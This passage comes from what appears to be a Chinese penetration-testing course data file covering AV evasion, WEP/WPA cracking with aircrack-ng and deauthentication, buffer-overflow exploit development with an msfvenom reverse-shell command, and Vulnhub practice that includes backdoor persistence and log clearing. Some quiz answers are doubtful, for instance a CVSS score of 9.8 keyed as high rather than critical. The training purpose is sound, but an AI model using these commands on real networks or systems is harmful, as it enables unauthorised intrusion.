      { type: 'fill', question: '杀软的______检测监控程序运行时的可疑行为，比特征码检测更难绕过。', correctAnswer: '行为', explanation: '行为检测监控API调用、文件操作、网络连接等行为，比静态特征码检测更难绕过。' },
      { type: 'multiple', question: '以下哪些是免杀技术？（多选）', options: ['A. MSF编码器', 'B. UPX加壳', 'C. Nmap扫描', 'D. 分离加载'], correctIndices: [0, 1, 3], explanation: 'MSF编码器、UPX加壳、分离加载都是免杀技术，Nmap是扫描工具。' },
      { type: 'single', question: 'PowerShell被认为天然适合免杀的原因？', options: ['A. 体积小', 'B. 系统自带且功能强大', 'C. 速度快', 'D. 免费'], correctIndex: 1, explanation: 'PowerShell是Windows系统自带工具，攻击者可以利用它执行恶意代码，而且很多安全产品对PowerShell监控不足。' }
    ],
    expertNotes: [
      { author: '免杀研究员', title: '免杀技术原理', content: '免杀的核心是理解检测机制。特征码检测看文件内容，行为检测看运行时动作。最可靠的免杀是分离加载，让静态文件看起来完全正常。', url: 'https://www.ired.team/' },
      { author: '红队攻击手', title: '实战免杀技巧', content: '实战中建议先用Veil生成多个payload，上VT检测找一个低于5/70的。然后根据检测结果针对性优化。PowerShell加载器最难被静态检测。', url: 'https://www.virustotal.com/' },
      { author: '安全研究员', title: '行为检测对抗', content: '行为检测越来越智能。即使过了静态检测，异常行为如VirtualAlloc+CreateThread也会被监控。考虑LOLBins技术，利用系统自带工具执行。' }
    ],
    environmentSetup: {
      prerequisites: ['Kali Linux', 'Veil或GreatSCT', 'Windows靶机 with 杀软', 'VirusTotal账号'],
      verificationSteps: ['1. 生成编码后的木马', '2. 上传VT检测查杀率', '3. 编写分离加载器', '4. 测试VT检测', '5. 优化到免杀状态']
    }
  ,
      resources: [{"name": "免杀技术完全指南", "url": "https://www.freebuf.com/articles/system/289012.html", "type": "article"}, {"name": "Shellcode混淆技术", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}, {"name": "AV绕过方法汇总", "url": "https://github.com/alphaSeclab/awesome-av-bypass", "type": "article"}, {"name": "Veil免杀框架", "url": "https://www.veil-framework.com/", "type": "article"}]},
  { 
    id: 'pen-27', 
    day: 27, 
    title: '无线网络安全', 
    subtitle: 'Wireless Security', 
    objectives: ['理解无线协议原理', '掌握WEP/WPA破解', '学习 WPA2PSK破解', '了解无线防御措施'], 
    content: `无线网络渗透是渗透测试的重要分支，涉及802.11协议的安全研究。

【无线协议演进】
• WEP（Wired Equivalent Privacy）：早期加密，使用RC4算法，已被破解
• WPA（Wi-Fi Protected Access）：过渡标准，使用TKIP加密
• WPA2：当前主流，使用AES-CCMP加密，安全性较高
• WPA3：最新标准，支持SAE握手，更安全

【802.11帧类型】
• 管理帧：Beacon、Probe Request/Response、Association Request/Response
• 控制帧：RTS/CTS、ACK
• 数据帧：携带实际数据

【Monitor模式与监听】
• airmon-ng start wlan0 - 开启监听模式
• airmon-ng check kill - 终止冲突进程
• airmon-ng stop wlan0mon - 停止监听模式

【WEP破解】
WEP使用24位IV（初始化向量），同一密钥加密的数据越多越容易破解。
• airodump-ng wlan0mon - 监听附近网络
• airodump-ng -c 频道 --bssid MAC -w wep.cap wlan0mon - 抓包
• aireplay-ng -1 0 -a AP_MAC -h 客户端MAC wlan0mon - 伪关联
• aireplay-ng -3 -b AP_MAC -h 客户端MAC wlan0mon - 注入 ARP请求
• aircrack-ng wep.cap - 破解密码

【WPA/WPA2破解】
WPA使用四次握手验证，破解需要捕获握手包后字典攻击。
• airodump-ng -c 频道 --bssid AP_MAC -w wpa.cap wlan0mon - 抓握手包
• aireplay-ng -0 1 -a AP_MAC -c 客户端MAC wlan0mon - 解除认证强制重新握手
• aircrack-ng -w wordlist.txt wpa.cap - 字典破解

【WPA-PSK破解原理】
四次握手过程中，客户端和AP交换确认信息：
1. AP发送Anonce给客户端
2. 客户端发送SNonce和MIC给AP
3. AP发送GTK和MIC
4. 客户端确认

攻击者监听握手包后，用字典中的密码计算MIC，与捕获的MIC对比。

【PMKID攻击】
• 某些路由器支持发送PMKID
• wlandump工具可以直接获取PMKID
• hashcat可以更快地破解

【Wireless Client蜜罐】
• airbase-ng -c 频道 -e FakeAP wlan0mon - 创建恶意热点
• 诱使客户端连接后获取密码或进行中间人攻击

【防御措施】
• 使用WPA3或强WPA2密码
• 隐藏SSID不能真正安全
• MAC地址过滤可被伪造
• 定期更换密码
• 企业WiFi使用802.1X认证
• WPA3的SAE握手抗字典攻击更强`, 
    keyPoints: ['WEP已不安全可秒破', 'WPA需要抓握手包字典破解', 'aireplay-ng强制解除认证', 'aircrack-ng用字典破解', 'WPA3使用SAE抗字典攻击'],
    codeExamples: [{ title: '无线破解脚本', language: 'bash', code: `# WEP破解流程\n# 1. 监听模式\nairmon-ng start wlan0\n\n# 2. 扫描网络\nairodump-ng wlan0mon\n\n# 3. 抓包\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon\n\n# 4. 伪关联\naireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon\n\n# 5. 注入ARP\naireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon\n\n# 6. 破解\naircrack-ng wep-01.cap\n\n# WPA破解流程\n# 1. 监听模式\nairmon-ng start wlan0\n\n# 2. 抓握手包\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa wlan0mon\n\n# 3. 强制重新握手\naireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon\n\n# 4. 字典破解\naircrack-ng -w passwords.txt wpa-01.cap\n\n# hashcat破解PMKID\nhashcat -m 16800 -a 0 pmkid.txt wordlist.txt`, explanation: 'WEP和WPA的完整破解流程' }],
    labEnvironment: [{ name: '无线渗透实验', description: '使用Kali练习无线破解', url: 'https://www.kali.org/', type: 'local', setup: '1. 准备支持监听模式的无线网卡\n2. 安装Kali并配置无线网卡\n3. 设置一个WEP或WPA2-PSK的测试路由器\n4. 练习WEP破解流程\n5. 练习WPA破解流程\n6. 尝试PMKID攻击\n7. 学习使用hashcat加速破解', expectedOutput: '掌握无线网络破解技术，理解无线协议安全问题' }],
    recommendedTools: [{ name: 'Aircrack-ng', description: '无线网络审计工具', url: 'https://www.aircrack-ng.org/', type: 'local' }, { name: 'Hashcat', description: 'GPU密码破解工具', url: 'https://hashcat.net/', type: 'local' }, { name: 'Wifite', description: '无线自动化破解工具', url: 'https://github.com/derv82/wifite2', type: 'local' }],
    quiz: [
      { type: 'single', question: 'WEP加密使用什么算法？', options: ['A. AES', 'B. RC4', 'C. DES', 'D. RSA'], correctIndex: 1, explanation: 'WEP使用RC4流加密算法，但由于IV过短和算法缺陷已被破解。' },
      { type: 'single', question: 'WPA/WPA2破解需要什么关键数据？', options: ['A. 加密后的数据包', 'B. 四次握手包', 'C. 路由器MAC地址', 'D. 客户端IP地址'], correctIndex: 1, explanation: 'WPA/WPA2四次握手中包含验证信息，捕获握手包后可以用字典攻击破解PSK密码。' },
      { type: 'boolean', question: '隐藏SSID的无线网络比广播SSID的更安全。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '隐藏SSID只是不广播，但连接时仍会发送SSID信息，可被监听获取，不能提供真正的安全保护。' },
      { type: 'fill', question: 'aireplay-ng的-0参数用于发送______帧，强制客户端重新认证。', correctAnswer: '解除认证', explanation: 'aireplay-ng -0发送解除认证(Deauthentication)帧，迫使客户端断开重连，从而捕获握手包。' },
      { type: 'multiple', question: '以下哪些是无线安全建议？（多选）', options: ['A. 使用WPA3', 'B. 隐藏SSID', 'C. 强密码', 'D. MAC地址过滤'], correctIndices: [0, 2], explanation: 'WPA3和强密码是有效的安全措施；隐藏SSID和MAC过滤可被绕过，不是真正的安全防护。' },
      { type: 'single', question: 'PMKID攻击相比传统WPA破解的优势？', options: ['A. 不需要握手包', 'B. 破解速度更快', 'C. 不需要客户端', 'D. 不需要字典'], correctIndex: 2, explanation: 'PMKID攻击不需要等待客户端连接，可以直接从AP获取，可攻击无客户端连接的路由器。' }
    ],
    expertNotes: [
      { author: '无线安全研究员', title: '无线渗透实战', content: '无线渗透的关键是信号和字典。有好字典和足够的时间，WPA2-PSK可以被破解。企业WiFi使用802.1X认证才更安全。', url: 'https://www.aircrack-ng.org/' },
      { author: '无线Hacker', title: 'WPA3安全性分析', content: 'WPA3使用SAE（Simultaneous Authentication of Equals）握手，抗字典攻击能力更强。但WPA3-SAE存在Dragonblood漏洞，仍可被破解。', url: 'https://hashcat.net/' },
      { author: '渗透测试工程师', title: '无线防御建议', content: '对于家庭用户：使用WPA3+强密码；对于企业：使用802.1X + RADIUS服务器。定期更换密码，监控未授权热点。' }
    ],
    environmentSetup: {
      prerequisites: ['支持监听模式的无线网卡', 'Kali Linux', '测试用无线路由器'],
      verificationSteps: ['1. 配置无线网卡到监听模式', '2. 扫描周围无线网络', '3. 破解WEP网络', '4. 破解WPA2-PSK网络', '5. 了解PMKID攻击']
    }
  ,
      resources: [{"name": "无线安全入门指南", "url": "https://www.aircrack-ng.org/documentation.html", "type": "article"}, {"name": "WiFi渗透测试手册", "url": "https://www.freebuf.com/articles/wireless/298023.html", "type": "article"}, {"name": "Aircrack-ng使用教程", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}, {"name": "WPA3安全分析", "url": "https://www.freebuf.com/articles/wireless/289012.html", "type": "article"}]},
  { 
    id: 'pen-28', 
    day: 28, 
    title: '缓冲区溢出利用开发', 
    subtitle: 'Exploit Development', 
    objectives: ['掌握漏洞分析方法', '学会编写exploit', '掌握ROP绕过DEP', '理解ASLR绕过'], 
    content: `缓冲区溢出利用开发是将漏洞转化为可控代码执行的技术，需要深入理解计算机系统底层。

【缓冲区溢出原理】
当程序向缓冲区写入数据时，超过缓冲区边界，会覆盖相邻内存。覆盖返回地址后，函数返回时会跳转到攻击者控制的地址。

【栈内存布局】
从高地址到低地址（x86）：
• 返回地址 - 函数返回后执行的指令地址
• Saved EBP - 保存的栈帧基址
• 局部变量 - 函数内声明的变量
• 函数参数 - 调用函数时传入的参数

【漏洞分析步骤】
1. 确认漏洞：发送超长数据观察程序行为
2. 计算偏移：确定覆盖返回地址需要的数据长度
3. 确定覆盖目标：返回地址、JMP ESP等

【调试工具】
• gdb/LLLDB：Linux程序调试
• Immunity Debugger：Windows程序调试
• x64dbg：Windows 64位调试
• Mona.py：WinDBG插件，自动寻找gadget

【Mona.py核心命令】
• !mona pattern_create 300 - 生成唯一字符模式
• !mona pattern_offset EIP值 - 查找偏移
• !mona jmp -r esp - 寻找JMP ESP地址
• !mona modules - 列出加载的模块
• !mona find -s "\\\\xff\\\\xe4" - 搜索指令序列

【DEP/NX绕过 - ROP】
DEP（Data Execution Prevention）禁止在栈上执行代码。
• ROP（Return-Oriented Programming）利用程序已有的代码片段
• 寻找gadget：pop pop ret、jmp esp等
• 构建ROP链：调用VirtualAlloc分配可执行内存，复制shellcode并执行

【ASLR绕过】
ASLR（Address Space Layout Randomization）随机化内存地址。
• 绕过方法：泄露内存地址、信息重用、未开启ASLR的模块
• 攻击思路：先泄露地址，再构造利用

【Stack Canary绕过】
Stack Cookie/Canary在返回地址前插入检测值。
• 绕过方法：泄露canary、覆盖canary、触发异常

【漏洞开发流程】
1. 生成pattern确定偏移
2. 控制EIP（返回地址）
3. 寻找可靠的跳转地址（JMP ESP）
4. 编写shellcode
5. 构建exploit
6. 调试和优化

【Shellcode编写】
• 定位：跳转到栈上的shellcode
• 编码：避免坏字节（0x00、0x0a、0x0d等）
• 功能：绑定shell、反弹shell、下载执行等

【坏字节处理】
• 常见坏字节：0x00（字符串结束）、0x0a（换行）、0x0d（回车）
• 测试方法：发送所有字节（除0x00），观察是否被过滤
• 逐步排除确定完整坏字节列表`, 
    keyPoints: ['溢出覆盖返回地址', 'Immunity Debugger是Windows调试器', 'Mona.py辅助漏洞开发', 'ROP链绕过DEP', '信息泄露绕过ASLR'],
    codeExamples: [{ title: '简单溢出exploit示例', language: 'python', code: `# 简单缓冲区溢出exploit示例\n\nfrom pwn import *\n\n# 连接到靶机\n# r = remote(\"target\", 9999)\n\n# 生成测试pattern\n# pattern = cyclic(300)\n# r.send(pattern)\n# r.wait()\n# 控制EIP在哪里\n\n# 确定偏移后构造exploit\noffset = 200  # 确定覆盖EIP的偏移\n\n# 寻找的JMP ESP地址（需在无ASLR模块中）\njmp_esp = p32(0x08041404)  # 示例地址\n\n# MSFVenom生成shellcode\n# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f py -e x86/shikata_ga_nai -i 3\nshellcode = b\"\"\nshellcode += b\"\\\\x90\" * 16  # NOP sled\nshellcode += b\"\\\\xb8\\\\x90\\\\x01\\\\x00\\\\x00\"  # mov eax, 0x190\nshellcode += b\"\\\\x31\\\\xc0\\\\x40\\\\xcd\\\\x80\"  # return\n\n# 构建payload\npayload = b\"A\" * offset\npayload += jmp_esp\npayload += shellcode\n\n# 发送\nexploit = payload\nprint(f\"Exploit长度: {len(exploit)}\")\n\n# 使用Mona生成pattern\n# !mona pattern_create 300\n# !mona pattern_offset EIP值\n# !mona jmp -r esp  # 在无ASLR模块中找`, explanation: '简单的缓冲区溢出exploit构造流程' }],
    labEnvironment: [{ name: '漏洞利用开发实验', description: '使用Immunity Debugger练习漏洞利用', url: 'https://www.immunityinc.com/', type: 'local', setup: '1. 安装Immunity Debugger和Mona.py\n2. 下载存在漏洞的旧版软件（如Vulnserver）\n3. 练习使用Mona.py生成pattern和找偏移\n4. 寻找JMP ESP并构造exploit\n5. MSFVenom生成shellcode\n6. 完整利用漏洞\n7. 尝试绕过DEP和ASLR', expectedOutput: '掌握漏洞利用开发流程，能编写简单的exploit' }],
    recommendedTools: [{ name: 'Immunity Debugger', description: 'Windows调试器', url: 'https://www.immunityinc.com/', type: 'local' }, { name: 'Mona.py', description: '漏洞利用辅助工具', url: 'https://github.com/corelan/mona', type: 'local' }, { name: 'pwntools', description: '漏洞利用开发框架', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }],
    quiz: [
      { type: 'single', question: '缓冲区溢出中，覆盖哪个地址可以控制程序执行流程？', options: ['A. 变量地址', 'B. 返回地址', 'C. 函数参数', 'D. 栈帧地址'], correctIndex: 1, explanation: '覆盖返回地址，函数返回时会跳转到攻击者指定的地址执行代码。' },
      { type: 'single', question: 'DEP/NX是防护什么的机制？', options: ['A. 防止溢出', 'B. 禁止栈上执行代码', 'C. 防止信息泄露', 'D. 防止密码破解'], correctIndex: 1, explanation: 'DEP（Data Execution Prevention）禁止在栈、堆等非可执行内存区域执行代码。' },
      { type: 'boolean', question: 'ASLR随机化了程序代码段的地址，使漏洞利用更难。', options: ['A. 正确', 'B. 错误'], correctIndex: 0, explanation: 'ASLR随机化堆、栈、库文件的加载地址，增加了漏洞利用的难度。' },
      { type: 'fill', question: 'Mona.py的______命令可以生成唯一的字符模式，用于确定偏移。', correctAnswer: 'pattern_create', explanation: 'pattern_create生成唯一的字符串序列，确定覆盖EIP需要的数据长度。' },
      { type: 'multiple', question: '以下哪些是绕过DEP的技术？（多选）', options: ['A. ROP', 'B. JMP ESP', 'C. Stack Pivot', 'D. 信息泄露'], correctIndices: [0, 2], explanation: 'ROP和Stack Pivot（栈迁移）是绕过DEP的常用技术。JMP ESP是跳转，不是绕过DEP。' },
      { type: 'single', question: 'Stack Canary的作用？', options: ['A. 加密数据', 'B. 检测溢出', 'C. 隐藏返回地址', 'D. 加速执行'], correctIndex: 1, explanation: 'Canary是放在返回地址前的检测值，溢出时会破坏Canary，函数返回前检测到即可发现溢出。' }
    ],
    expertNotes: [
      { author: '漏洞研究员', title: 'Exploit开发入门', content: '漏洞利用开发需要扎实的计算机基础：汇编语言、内存布局、调用约定。建议从简单栈溢出开始，理解原理后再学DEP/ASLR绕过。', url: 'https://www.corelan.be/' },
      { author: '二进制安全专家', title: 'ROP技术详解', content: 'ROP的核心是找到有用的gadget（以ret结尾的指令序列）。找gadget推荐使用RP++或ropeme工具。注意避免坏字节。', url: 'https://github.com/JonathanSalwan/ROPgadget' },
      { author: '安全研究员', title: '实战漏洞利用', content: '实战中软件版本更新快，漏洞越来越少。建议关注CVE数据库，学习公开exploit的分析和改编。exploit-db和packetstorm是好资源。' }
    ],
    environmentSetup: {
      prerequisites: ['Immunity Debugger', 'Mona.py', '存在漏洞的软件', 'Python with pwntools'],
      verificationSteps: ['1. 安装Immunity Debugger和Mona.py', '2. 配置Mona工作目录', '3. 调试漏洞程序', '4. 生成pattern找偏移', '5. 构造exploit', '6. 测试shellcode执行']
    }
  ,
      resources: [{"name": "漏洞利用开发入门", "url": "https://www.corelan.be/index.php/articles/", "type": "article"}, {"name": "Exploit-DB漏洞库", "url": "https://www.exploit-db.com/", "type": "article"}, {"name": "ROP技术详解", "url": "https://www.freebuf.com/articles/system/278901.html", "type": "article"}, {"name": "Shellcode编写教程", "url": "https://www.anquanke.com/post/id/298023", "type": "article"}]},
  { 
    id: 'pen-29', 
    day: 29, 
    title: '综合靶机渗透演练', 
    subtitle: 'Vulnhub Walkthrough', 
    objectives: ['掌握完整渗透流程', '综合运用所有技术', '培养解题思路', '记录渗透过程'], 
    content: `综合靶机渗透是将所有渗透技术综合运用的实战练习，需要完整的渗透测试流程。

【靶机资源】
• Vulnhub.com：提供大量真实漏洞虚拟机
• HackTheBox：在线渗透测试平台
• TryHackMe：适合新手的在线平台
• PentesterLab：Web渗透练习
• OverTheWire：CTF风格的练习

【经典靶机系列】
• Kioptrix系列：经典入门靶机
• Stapler：内容丰富的中级靶机
• Mr Robot：CTF风格
• DC系列：域渗透练习
• Boson：网络工程师练习

【完整渗透测试流程】
1. 侦察（Reconnaissance）
   - 主机发现：nmap -sn
   - 端口扫描：nmap -sS -sV -p-
   - 服务识别：版本、banner抓取
   - 目录扫描：gobuster、dirb

2. 漏洞评估（Vulnerability Assessment）
   - searchsploit查找exploit
   - 漏洞验证
   - 优先级排序

3. 漏洞利用（Exploitation）
   - 选择合适的exploit
   - 定制化修改
   - 获取初始shell

4. 权限提升（Privilege Escalation）
   - 信息收集：系统版本、补丁、服务
   - 查找提权向量
   - SUID、计划任务、配置错误、内核漏洞

5. 维持访问（Persistence）
   - 添加后门用户
   - SSH公钥登录
   - Webshell
   - 定时任务

6. 清理痕迹（Covering Tracks）
   - 清理日志
   - 删除临时文件
   - 修改时间戳

【渗透文档记录】
• 记录每个步骤和命令
• 截图重要发现
• 记录关键信息：IP、密码、flag
• 总结技术和思路

【靶机练习建议】
• 先自己尝试，思考解决
• 看writeup学习思路，不只是结果
• 记录学习笔记和新技术
• 复现并改进方法

【CTF与渗透的区别】
• CTF：flag是目标，有明确边界
• 渗透测试：发现更多漏洞为目标
• 渗透测试需要编写报告`, 
    keyPoints: ['Vulnhub提供真实漏洞靶机', '完整流程：侦察→利用→提权→维持', '记录每个步骤和发现', '截图是重要证据', '靶机练习是最佳学习方式'],
    codeExamples: [{ title: '渗透测试报告模板', language: 'markdown', code: `# 渗透测试报告\n\n## 执行摘要\n本次渗透测试对[目标]进行了全面评估，发现[X]个高危漏洞...\n\n## 测试范围\n- 目标IP：192.168.1.100\n- 测试时间：2024-01-01\n- 测试边界：仅限内网\n\n## 发现漏洞\n\n### 漏洞1：SQL注入\n- 严重程度：高\n- CVSS评分：9.8\n- 描述：搜索参数未过滤\n- 利用过程：...\n- 修复建议：使用参数化查询\n\n## 详细分析\n\n### 信息收集\n\`\`\`bash\nnmap -sS -sV 192.168.1.100\n# 结果：发现开放端口 22,80,3306\n\`\`\`\n\n### 漏洞利用\n\`\`\`bash\nsqlmap -u \"http://target/search?q=1\" --dbs\n\`\`\`\n\n### 权限提升\n通过SUDO配置错误获取root...\n\n## 附录\n- 截图1：漏洞位置\n- 截图2：利用成功`, explanation: '渗透测试报告模板，包含完整结构' }],
    labEnvironment: [{ name: 'Vulnhub靶机练习', description: '下载并练习Vulnhub靶机', url: 'https://www.vulnhub.com/', type: 'online', setup: '1. 从Vulnhub下载靶机（如Kioptrix Level 1）\n2. 在VirtualBox导入并运行\n3. 配置攻击机网络使能互通\n4. 按照渗透测试流程完整练习\n5. 完成靶机后查看writeup对比\n6. 逐步挑战更高难度靶机\n7. 记录每个靶机的学习笔记', expectedOutput: '掌握完整渗透测试流程，能独立完成中等难度靶机' }],
    recommendedTools: [{ name: 'Vulnhub', description: '漏洞靶机资源', url: 'https://www.vulnhub.com/', type: 'online' }, { name: 'HackTheBox', description: '在线渗透平台', url: 'https://www.hackthebox.eu/', type: 'online' }, { name: 'TryHackMe', description: '新手友好平台', url: 'https://tryhackme.com/', type: 'online' }],
    quiz: [
      { type: 'single', question: '渗透测试流程的第一步是什么？', options: ['A. 漏洞利用', 'B. 权限提升', 'C. 情报收集', 'D. 编写报告'], correctIndex: 2, explanation: '渗透测试从情报收集开始，收集的信息决定后续攻击方向。' },
      { type: 'single', question: 'Vulnhub靶机的主要作用是？', options: ['A. 学习编程', 'B. 练习渗透技术', 'C. 数据库管理', 'D. 网络配置'], correctIndex: 1, explanation: 'Vulnhub提供有已知漏洞的虚拟机，用于练习渗透测试技术。' },
      { type: 'boolean', question: '渗透测试和CTF的目标完全相同。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'CTF以获取flag为目标，渗透测试以发现和利用漏洞、提交报告为目标。' },
      { type: 'fill', question: '渗透测试最后一步是清理痕迹，也叫______。', correctAnswer: 'Covering Tracks', explanation: '清理痕迹（Covering Tracks）是渗透测试的最后一步，清理日志和证据。' },
      { type: 'multiple', question: '以下哪些是渗透测试的主要步骤？（多选）', options: ['A. 情报收集', 'B. 漏洞利用', 'C. 权限提升', 'D. 游戏娱乐'], correctIndices: [0, 1, 2], explanation: '情报收集、漏洞利用、权限提升都是渗透测试的核心步骤。' },
      { type: 'single', question: '记录渗透过程不需要记录什么？', options: ['A. 使用的命令', 'B. 重要发现', 'C. 个人隐私信息', 'D. 截图'], correctIndex: 2, explanation: '渗透测试记录应关注技术细节和发现，不应记录与测试无关的个人隐私信息。' }
    ],
    expertNotes: [
      { author: 'Vulnhub作者', title: '靶机学习建议', content: '靶机是学习渗透测试的最佳方式。先自己尝试解决，实在无法突破再看writeup。关键不是通关，而是理解方法和思路。', url: 'https://www.vulnhub.com/' },
      { author: 'HTB玩家', title: 'HackTheBox攻略', content: 'HTB的退役靶机可以免费使用，是学习的好资源。先从Easy开始，逐步挑战Medium和Hard。每台靶机都要做好笔记。', url: 'https://www.hackthebox.eu/' },
      { author: '渗透测试专家', title: '实战经验谈', content: '实战中信息收集往往决定成败。nmap扫全端口、目录扫描、信息枚举都要做到位。耐心和信息整合是突破的关键。' }
    ],
    environmentSetup: {
      prerequisites: ['VirtualBox或VMware', 'Kali Linux攻击机', 'Vulnhub靶机', '网络配置能力'],
      verificationSteps: ['1. 下载并导入Vulnhub靶机', '2. 配置网络使攻击机与靶机互通', '3. 按流程完整渗透一台靶机', '4. 记录每个步骤', '5. 获得root/system权限', '6. 总结技术要点']
    }
  ,
      resources: [{"name": "VulnHub靶机合集", "url": "https://www.vulnhub.com/", "type": "article"}, {"name": "HackTheBox平台指南", "url": "https://www.hackthebox.com/", "type": "article"}, {"name": "渗透测试实战案例", "url": "https://www.freebuf.com/articles/web/289012.html", "type": "article"}, {"name": "综合靶机渗透流程", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}]},
  { 
    id: 'pen-30', 
    day: 30, 
    title: '渗透测试报告', 
    subtitle: 'Penetration Testing Report', 
    objectives: ['掌握报告结构', '学会漏洞分级', '编写专业报告', '提供修复建议'], 
    content: `渗透测试报告是渗透测试工作的最终交付物，需要专业、完整、可操作，是衡量渗透测试质量的关键。

【报告结构】
1. 执行摘要（Executive Summary）
2. 测试范围（Scope）
3. 测试方法（Methodology）
4. 发现漏洞列表（Findings Summary）
5. 详细漏洞分析（Detailed Findings）
6. 修复建议（Remediation Recommendations）
7. 附录（Appendices）

【执行摘要】
• 用非技术语言总结测试结果
• 目标受众：管理层、CISO
• 内容：测试背景、主要发现（数量、严重程度）、业务风险、建议优先级
• 长度：1-2页

【测试范围】
• 目标系统/IP/域名
• 测试时间窗口
• 测试类型（黑盒/灰盒/白盒）
• 测试限制和例外

【测试方法论】
• 引用标准：PTES、OWASP、NIST
• 测试阶段：侦察→威胁建模→漏洞分析→渗透利用→后渗透→报告
• 工具列表

【漏洞描述模板】
漏洞ID：FIND-001
漏洞名称：SQL注入漏洞
严重程度：高危（High）
CVSS评分：9.8 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
受影响系统：Web应用服务器 192.168.1.100
漏洞描述：...
利用前提：攻击者需要能访问Web应用
利用过程：
  1. 访问 http://target/search?id=1'
  2. 观察SQL错误信息
  3. 使用UNION注入提取数据
  4. 获取管理员凭据
风险分析：可导致数据库被完全控制，用户数据泄露
修复建议：
  1. 使用参数化查询
  2. 实施输入验证
  3. 限制数据库用户权限
参考资料：OWASP Top 10 2021 - A03:2021-Injection

【CVSS评分标准】
• 时间度量：Temporal（E:H/RL:X/RC:X）
• 环境度量：Environmental（CR:X/IR:X/AR:X）
• 向量字符串：CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

【修复建议撰写】
• 针对每个漏洞给出具体可操作的建议
• 按优先级排序：Critical → High → Medium → Low → Info
• 给出具体修复代码或配置示例
• 提供参考资源

【报告工具】
• Dradis：专业渗透测试报告工具
• Faraday：协作式渗透测试平台
• Serpico：Metasploit报告工具
• CherryTree：笔记整理
• LibreOffice/Word：编写报告

【报告审查清单】
• 语法和拼写检查
• 技术准确性验证
• 漏洞描述清晰完整
• 修复建议可操作
• 截图和证据齐全
• 格式专业统一

【与客户沟通】
• 报告递交后安排会议
• 解释关键发现
• 回答技术问题
• 讨论修复优先级
• 提供修复技术支持`, 
    keyPoints: ['渗透报告是最终交付物', '执行摘要供管理层阅读', '详细分析供技术人员参考', 'CVSS标准化漏洞级别', '修复建议需具体可行'],
    codeExamples: [{ title: '渗透测试报告示例', language: 'markdown', code: `# 渗透测试报告示例\n\n## 1. 执行摘要\n\n本次渗透测试对XXX公司内网系统进行了全面的安全评估。测试团队在约定的范围内发现**8个安全漏洞**，其中**3个高危漏洞**需要立即处理。\n\n主要风险：SQL注入可导致数据库完全被控；弱密码策略导致内网多台机器可被横向渗透。\n\n建议优先级：立即修复高危漏洞，1个月内修复中危漏洞。\n\n## 2. 测试范围\n\n| 目标 | IP | 测试时间 |\n|------|-----|----------|\n| Web服务器 | 192.168.1.100 | 2024-01-01 |\n| 域控制器 | 192.168.1.10 | 2024-01-01 |\n\n测试类型：灰盒测试（提供基础账号）\n\n## 3. 漏洞列表\n\n| ID | 漏洞名称 | 严重程度 | CVSS | 状态 |\n|----|----------|----------|------|------|\n| FIND-001 | SQL注入 | 高危 | 9.8 | 待修复 |\n| FIND-002 | 明文密码传输 | 高危 | 7.5 | 待修复 |\n| FIND-003 | 弱密码策略 | 中危 | 5.3 | 待修复 |\n\n## 4. 详细漏洞分析\n\n### FIND-001: SQL注入漏洞\n\n**严重程度**：高危\n**CVSS评分**：9.8\n\n**漏洞描述**：\n搜索参数未做输入过滤，存在SQL注入漏洞...\n\n**利用过程**：\n1. 访问搜索页面\n2. 输入单引号测试\n3. 观察SQL错误\n4. 使用UNION注入...\n\n**修复建议**：\n使用参数化查询...\n\n## 5. 修复建议\n\n### 高优先级\n1. 修复FIND-001 SQL注入（1周内）\n2. 修复FIND-002 明文密码（2周内）\n\n### 中优先级\n3. 强化密码策略（1个月内）`, explanation: '渗透测试报告结构和内容示例' }],
    labEnvironment: [{ name: '报告撰写练习', description: '使用报告工具撰写专业报告', url: 'https://dradisframework.com/', type: 'local', setup: '1. 使用Dradis或Serpico创建项目\n2. 导入之前靶机渗透的结果\n3. 按模板结构撰写报告\n4. 使用CVSS计算器评分\n5. 添加截图和证据\n6. 导出PDF/Word格式\n7. 同行评审和改进', expectedOutput: '掌握渗透测试报告撰写，能交付专业完整的报告' }],
    recommendedTools: [{ name: 'Dradis', description: '渗透测试报告工具', url: 'https://dradisframework.com/', type: 'local' }, { name: 'Serpico', description: 'Metasploit报告工具', url: 'https://github.com/SerpicoProject/Serpico', type: 'local' }, { name: 'CherryTree', description: '笔记整理工具', url: 'https://www.giuspen.com/cherrytree/', type: 'local' }],
    quiz: [
      { type: 'single', question: '渗透测试报告中执行摘要的主要受众是？', options: ['A. 开发人员', 'B. 技术人员', 'C. 管理层', 'D. 审计人员'], correctIndex: 2, explanation: '执行摘要用非技术语言总结发现和业务风险，供管理层决策参考。' },
      { type: 'single', question: 'CVSS评分9.8属于什么级别？', options: ['A. 低危', 'B. 中危', 'C. 高危', 'D. 严重'], correctIndex: 2, explanation: 'CVSS评分9.8属于高危/严重级别，需要立即处理。' },
      { type: 'boolean', question: '渗透测试报告只需要包含漏洞列表，不需要修复建议。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '渗透测试报告必须包含针对每个漏洞的具体修复建议，否则报告不完整。' },
      { type: 'fill', question: '______是标准化漏洞评分系统，用于评估漏洞的严重程度。', correctAnswer: 'CVSS', explanation: 'CVSS是标准化漏洞评分系统，用于评估漏洞的严重程度。' },
      { type: 'multiple', question: '以下哪些是渗透测试报告的必要组成部分？（多选）', options: ['A. 执行摘要', 'B. 测试范围', 'C. 游戏通关截图', 'D. 修复建议'], correctIndices: [0, 1, 3], explanation: '执行摘要、测试范围、修复建议都是报告的必要部分；游戏截图与渗透测试无关。' },
